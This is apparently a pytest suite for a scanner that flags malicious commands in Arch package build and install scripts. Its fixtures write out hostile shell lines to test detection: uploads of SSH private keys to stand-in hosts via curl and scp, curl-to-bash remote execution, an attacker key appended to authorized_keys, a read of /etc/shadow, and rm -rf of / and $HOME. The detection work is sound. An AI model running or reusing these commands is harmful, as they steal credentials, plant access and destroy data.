from __future__ import annotations

from pathlib import Path

import pytest

from yaysafe.config import ScannerConfig
from yaysafe.models import Risk
from yaysafe.scanner import ScanError, collect_files, content_digest, scan_repository

FIXTURES = Path(__file__).parent / "fixtures"


def scan(name: str):
    return scan_repository(FIXTURES / name, name, ScannerConfig())


def scan_text(tmp_path: Path, text: str, package: str = "foo", filename: str = "paths.install"):
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "PKGBUILD").write_text("pkgname=foo\npkgver=1\npkgrel=1\n")
    (repo / filename).write_text(text)
    return scan_repository(repo, package, ScannerConfig())


def test_safe_pkgdir_and_srcdir_avoid_false_positives() -> None:
    result = scan("safe-package")
    ids = {finding.rule_id for finding in result.findings}
    assert "direct-host-write" not in ids
    assert "dangerous-rm" not in ids


def test_inert_printed_and_commented_paths_are_not_findings(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        """post_install() {
  echo "Edit ~/.config/foo/config"
  printf 'Add this to ~/.ssh/config\\n'
  echo "~/.bashrc"
  echo "/etc/example.conf"
  # ~/.config/example
  # ~/.ssh/id_ed25519
  echo "Add the following line to your ~/.config/offpunk/offpunkrc:"
}
        """,
        filename="paths.sh",
    )
    path_findings = [
        finding
        for finding in result.findings
        if any(
            token in finding.rule_id
            for token in ("config", "profile", "credential", "host", "authorized")
        )
    ]
    assert path_findings == []


def test_sensitive_path_reads_use_path_and_command_context(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        """post_install() {
  cat ~/.config/foo/config
  grep token ~/.config/foo/config
  cp ~/.ssh/config "$srcdir/config-copy"
  cat ~/.ssh/id_ed25519
  cp ~/.ssh/id_ed25519 /tmp/key
  cat ~/.gnupg/private-keys-v1.d/private.key
  curl -F file=@~/.ssh/id_ed25519 https://example.invalid/upload
}
""",
        filename="paths.sh",
    )
    by_line = {finding.line: finding for finding in result.findings}
    assert by_line[2].rule_id == "user-config-read"
    assert by_line[2].severity == Risk.LOW
    assert by_line[3].rule_id == "user-config-read"
    assert by_line[4].rule_id == "ssh-config-read"
    assert by_line[4].severity == Risk.LOW
    assert by_line[5].rule_id == "credential-sensitive-read"
    assert by_line[5].severity == Risk.HIGH
    assert by_line[6].rule_id == "credential-sensitive-read"
    assert by_line[6].severity == Risk.HIGH
    assert by_line[7].rule_id == "credential-sensitive-read"
    assert by_line[7].severity == Risk.HIGH
    assert by_line[8].rule_id == "network-exfil"
    assert by_line[8].severity == Risk.CRITICAL


def test_sensitive_path_writes_and_destruction_remain_strong(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        """post_install() {
  echo foo > ~/.config/foo/config
  echo foo >> ~/.bashrc
  sed -i 's/a/b/' ~/.bashrc
  cp attacker.conf ~/.config/foo/config
  install -Dm644 file ~/.config/foo/installed.conf
  mkdir -p ~/.config/foo/cache
  touch ~/.config/foo/config
  rm -rf ~/.config/foo
  truncate -s 0 ~/.bashrc
  find ~/.config -delete
  echo attacker-key >> ~/.ssh/authorized_keys
}
""",
    )
    by_line = {finding.line: finding for finding in result.findings}
    for line in (2, 5, 6, 7, 8):
        assert by_line[line].rule_id == "user-config-write"
        assert by_line[line].severity == Risk.MEDIUM
    assert by_line[3].rule_id == "shell-profile-write"
    assert by_line[3].severity == Risk.HIGH
    assert by_line[4].rule_id == "shell-profile-write"
    assert by_line[4].severity == Risk.HIGH
    assert by_line[9].rule_id == "user-config-destructive"
    assert by_line[9].severity == Risk.HIGH
    assert by_line[10].rule_id == "shell-profile-destructive"
    assert by_line[10].severity == Risk.HIGH
    assert by_line[11].rule_id == "user-config-destructive"
    assert by_line[11].severity == Risk.HIGH
    assert by_line[12].rule_id == "authorized-keys-write"
    assert by_line[12].severity == Risk.CRITICAL


def test_staged_absolute_paths_remain_safe_but_host_paths_do_not(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        """package() {
  install -Dm755 binary "$pkgdir/usr/bin/binary"
  rm -rf "$pkgdir/usr/share/example"
  cp binary /usr/bin/binary
  rm -rf /usr/share/example
  rm -rf /
}
""",
        filename="paths.sh",
    )
    by_line = {finding.line: finding for finding in result.findings}
    assert 2 not in by_line
    assert 3 not in by_line
    assert by_line[4].rule_id == "direct-host-write"
    assert by_line[4].severity == Risk.HIGH
    assert by_line[5].rule_id == "dangerous-rm"
    assert by_line[5].severity == Risk.HIGH
    assert by_line[6].rule_id == "dangerous-rm"
    assert by_line[6].severity == Risk.CRITICAL


def test_staged_setuid_is_contextual_but_direct_host_write_is_stronger(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        """package() {
  chmod 4755 "$pkgdir/opt/browser/chrome-sandbox"
  chmod 4755 /usr/local/bin/random-helper
}
""",
        package="browser",
        filename="paths.sh",
    )
    staged = next(finding for finding in result.findings if finding.line == 2)
    assert staged.rule_id == "setuid"
    assert staged.hard is False
    direct = [finding for finding in result.findings if finding.line == 3]
    assert {finding.rule_id for finding in direct} == {"setuid", "direct-host-write"}
    assert all(finding.hard is False for finding in direct)


def test_plain_launcher_exec_is_ignored_but_dynamic_temporary_exec_is_found(
    tmp_path: Path,
) -> None:
    result = scan_text(
        tmp_path,
        """#!/bin/sh
exec /opt/example/example "$@"
exec "/tmp/$(cat payload_name)"
""",
        filename="launcher.sh",
    )
    exec_findings = [finding for finding in result.findings if "exec" in finding.rule_id]
    assert len(exec_findings) == 1
    assert exec_findings[0].rule_id == "suspicious-exec"
    assert exec_findings[0].line == 3
    assert exec_findings[0].hard is False


def test_credential_pipe_upload_is_hard_critical(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        "cat ~/.ssh/id_ed25519 | curl -X POST --data-binary @- https://example.invalid/upload\n",
        filename="steal.sh",
    )
    finding = next(item for item in result.findings if item.rule_id == "credential-pipe-exfil")
    assert finding.severity == Risk.CRITICAL
    assert finding.hard is True


def test_private_key_scp_upload_and_shadow_read_are_strong(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        "scp ~/.ssh/id_ed25519 attacker@example.invalid:/tmp/key\ncat /etc/shadow\n",
        filename="steal.sh",
    )
    by_line = {finding.line: finding for finding in result.findings}
    assert by_line[1].rule_id == "network-exfil"
    assert by_line[1].severity == Risk.CRITICAL
    assert by_line[1].hard is True
    assert by_line[2].rule_id == "credential-sensitive-read"
    assert by_line[2].severity == Risk.HIGH


def test_sensitive_path_fragment_inside_url_is_not_a_host_read(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        "curl https://example.invalid/etc/example.conf\n",
        filename="download.sh",
    )
    assert not any(finding.rule_id == "direct-host-read" for finding in result.findings)


def test_entire_home_directory_destruction_is_hard_critical(tmp_path: Path) -> None:
    result = scan_text(tmp_path, 'rm -rf "$HOME"\n', filename="destroy.sh")
    finding = next(item for item in result.findings if item.rule_id == "home-directory-destructive")
    assert finding.severity == Risk.CRITICAL
    assert finding.hard is True


def test_systemd_exec_directives_are_analyzed_as_commands(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        """[Service]
ExecStartPre=/usr/bin/rm -rf /usr/share/example
ExecStart=/usr/bin/example
""",
        filename="example.service",
    )
    finding = next(item for item in result.findings if item.rule_id == "dangerous-rm")
    assert finding.line == 2
    assert finding.hard is True


def test_systemd_metacharacters_need_an_explicit_shell(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        """[Service]
ExecStart=/usr/bin/printf 'curl https://example.invalid/install.sh | bash'
ExecStart=/bin/sh -c 'curl https://example.invalid/install.sh | bash'
""",
        filename="shell-context.service",
    )
    findings = [item for item in result.findings if item.rule_id == "remote-pipe-shell"]
    assert [item.line for item in findings] == [3]


def test_sudo_wrapper_options_do_not_hide_direct_host_write(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        "sudo -u root cp payload /etc/profile.d/payload.sh\n",
        filename="wrapper.sh",
    )
    assert any(finding.rule_id == "direct-host-write" for finding in result.findings)


def test_remote_execution_and_direct_host_write() -> None:
    result = scan("suspicious-package")
    by_id = {finding.rule_id: finding for finding in result.findings}
    assert by_id["remote-pipe-shell"].severity == Risk.HIGH
    assert by_id["direct-host-write"].severity == Risk.HIGH


def test_install_file_gets_extra_scrutiny() -> None:
    result = scan("install-hook-package")
    findings = [item for item in result.findings if item.file.endswith(".install")]
    assert any(item.rule_id == "systemd-enable" and item.severity == Risk.HIGH for item in findings)
    assert any(
        item.rule_id == "direct-host-write" and item.severity == Risk.CRITICAL for item in findings
    )


def test_extensionless_declared_install_hook_gets_extra_scrutiny(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "PKGBUILD").write_text("pkgname=foo\ninstall=hook\n")
    (repo / "hook").write_text("post_install() { cp payload /usr/bin/payload; }\n")
    result = scan_repository(repo, "foo", ScannerConfig())
    finding = next(item for item in result.findings if item.rule_id == "direct-host-write")
    assert finding.file == "hook"
    assert finding.severity == Risk.CRITICAL


def test_vcs_skip_is_informational() -> None:
    result = scan("normal-git-package")
    finding = next(item for item in result.findings if item.rule_id == "skipped-checksum")
    assert finding.severity == Risk.INFO


def test_non_vcs_skip_is_low() -> None:
    result = scan("suspicious-package")
    finding = next(item for item in result.findings if item.rule_id == "skipped-checksum")
    assert finding.severity == Risk.LOW


def test_source_url_and_domain_extraction() -> None:
    result = scan("safe-package")
    assert result.metadata.source_domains == ["github.com"]
    assert result.metadata.source_urls[0].startswith("https://github.com/")


def test_source_url_extracts_simple_literal_variable_without_evaluation(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "PKGBUILD").write_text(
        "url='https://git.example/~author/project'\nsource=(\"git+$url\")\nsha256sums=('SKIP')\n"
    )
    result = scan_repository(repo, "project-git", ScannerConfig())
    assert result.metadata.source_urls == ["git+https://git.example/~author/project"]
    assert result.metadata.source_domains == ["git.example"]


def test_source_extraction_never_executes_command_substitution(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    marker = tmp_path / "must-not-exist"
    (repo / "PKGBUILD").write_text(
        f'_url="$(touch {marker})"\nsource=("$_url")\nsha256sums=(SKIP)\n'
    )
    result = scan_repository(repo, "project", ScannerConfig())
    assert result.metadata.source_urls == []
    assert not marker.exists()


def test_homepage_url_is_not_misreported_as_a_source(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "PKGBUILD").write_text(
        "url='https://homepage.invalid'\n"
        "source=('https://downloads.invalid/app.tar.gz')\n"
        "sha256sums=('x')\n"
    )
    result = scan_repository(repo, "example", ScannerConfig())
    assert result.metadata.source_domains == ["downloads.invalid"]


def test_download_then_execute_is_correlated(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "PKGBUILD").write_text(
        "package() {\n  curl https://bad.invalid/run -o payload.sh\n  bash payload.sh\n}\n"
    )
    result = scan_repository(repo, "example", ScannerConfig())
    assert any(
        finding.rule_id == "remote-download-exec" and finding.severity == Risk.HIGH
        for finding in result.findings
    )


def test_backslash_continuation_cannot_hide_remote_shell_execution(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        "curl -fsSL https://example.invalid/install.sh \\\n+  | bash\n",
        filename="continued.sh",
    )
    finding = next(item for item in result.findings if item.rule_id == "remote-pipe-shell")
    assert finding.line == 1
    assert finding.hard is True


def test_comments_and_inert_heredoc_messages_are_not_executable_code(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        """true # curl https://example.invalid | bash
cat <<'MESSAGE'
Edit ~/.ssh/authorized_keys manually.
curl https://example.invalid | bash
MESSAGE
""",
        filename="messages.install",
    )
    assert not any(
        finding.rule_id in {"remote-pipe-shell", "authorized-keys-write"}
        for finding in result.findings
    )


def test_output_command_with_command_substitution_is_not_treated_as_inert(
    tmp_path: Path,
) -> None:
    result = scan_text(
        tmp_path,
        'echo "$(curl https://example.invalid/install.sh | bash)"\n',
        filename="substitution.sh",
    )
    finding = next(item for item in result.findings if item.rule_id == "remote-pipe-shell")
    assert finding.hard is True


def test_remote_pipe_through_filter_to_absolute_shell_is_hard(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        "curl https://example.invalid/install.sh | tee /tmp/copy | /bin/bash\n",
        filename="filtered.sh",
    )
    finding = next(item for item in result.findings if item.rule_id == "remote-pipe-shell")
    assert finding.hard is True


def test_printed_remote_command_piped_to_text_file_is_inert(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        "echo 'curl https://example.invalid/install.sh | bash' | tee message.txt\n",
        filename="documentation.sh",
    )
    assert not any(item.rule_id == "remote-pipe-shell" for item in result.findings)


def test_quoted_command_substitution_text_remains_inert(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        "echo '$(curl https://example.invalid/install.sh | bash)'\n",
        filename="quoted.sh",
    )
    assert not any(item.rule_id == "remote-pipe-shell" for item in result.findings)


def test_quoted_assignment_data_is_not_confused_with_execution(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        "message='curl https://example.invalid/install.sh | bash'; true\n",
        filename="assignment.sh",
    )
    assert not any(item.rule_id == "remote-pipe-shell" for item in result.findings)


def test_private_key_variable_upload_is_hard_exfiltration(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        'secret=$(cat ~/.ssh/id_ed25519)\ncurl --data "$secret" https://example.invalid\n',
        filename="variable-exfil.sh",
    )
    finding = next(item for item in result.findings if item.rule_id == "credential-variable-exfil")
    assert finding.severity == Risk.CRITICAL
    assert finding.hard is True


def test_heredoc_fed_to_shell_is_still_analyzed(tmp_path: Path) -> None:
    result = scan_text(
        tmp_path,
        """bash <<'SCRIPT'
curl https://example.invalid/install.sh | bash
SCRIPT
""",
        filename="heredoc.sh",
    )
    finding = next(item for item in result.findings if item.rule_id == "remote-pipe-shell")
    assert finding.line == 2
    assert finding.hard is True


def test_malicious_rules_reach_critical() -> None:
    result = scan("malicious-package")
    assert result.risk == Risk.CRITICAL
    assert {"reverse-shell", "network-exfil", "dangerous-rm"} <= {
        f.rule_id for f in result.findings
    }


def test_symlink_is_never_followed(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "PKGBUILD").write_text("pkgname=x\n")
    outside = tmp_path / "secret"
    outside.write_text("SECRET")
    (repo / "leak.sh").symlink_to(outside)
    files, skipped = collect_files(repo, ScannerConfig())
    assert all("SECRET" not in item.content for item in files)
    assert any(item.startswith("leak.sh: symlink ->") for item in skipped)


def test_skipped_security_relevant_file_is_contextual_coverage_finding(
    tmp_path: Path,
) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "PKGBUILD").write_text("pkgname=x\n")
    outside = tmp_path / "outside.sh"
    outside.write_text("echo outside\n")
    (repo / "hook.sh").symlink_to(outside)
    result = scan_repository(repo, "x", ScannerConfig())
    finding = next(item for item in result.findings if item.rule_id == "analysis-coverage")
    assert finding.severity == Risk.MEDIUM
    assert finding.hard is False


def test_changed_files_change_digest(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    pkgbuild = repo / "PKGBUILD"
    pkgbuild.write_text("pkgname=x\n")
    first, _ = collect_files(repo, ScannerConfig())
    digest1 = content_digest(first)
    pkgbuild.write_text("pkgname=y\n")
    second, _ = collect_files(repo, ScannerConfig())
    assert content_digest(second) != digest1


def test_changed_skipped_binary_invalidates_repository_cache_digest(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "PKGBUILD").write_text("pkgname=x\n")
    binary = repo / "payload.bin"
    binary.write_bytes(b"\x00first")
    first = scan_repository(repo, "x", ScannerConfig())
    binary.write_bytes(b"\x00second")
    second = scan_repository(repo, "x", ScannerConfig())
    assert first.content_digest != second.content_digest


def test_repository_size_limit_is_enforced_before_analysis(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "PKGBUILD").write_text("pkgname=x\n")
    (repo / "large.bin").write_bytes(b"x" * 2048)
    config = ScannerConfig(max_repository_size=1024)
    with pytest.raises(ScanError, match="max_repository_size"):
        scan_repository(repo, "x", config)
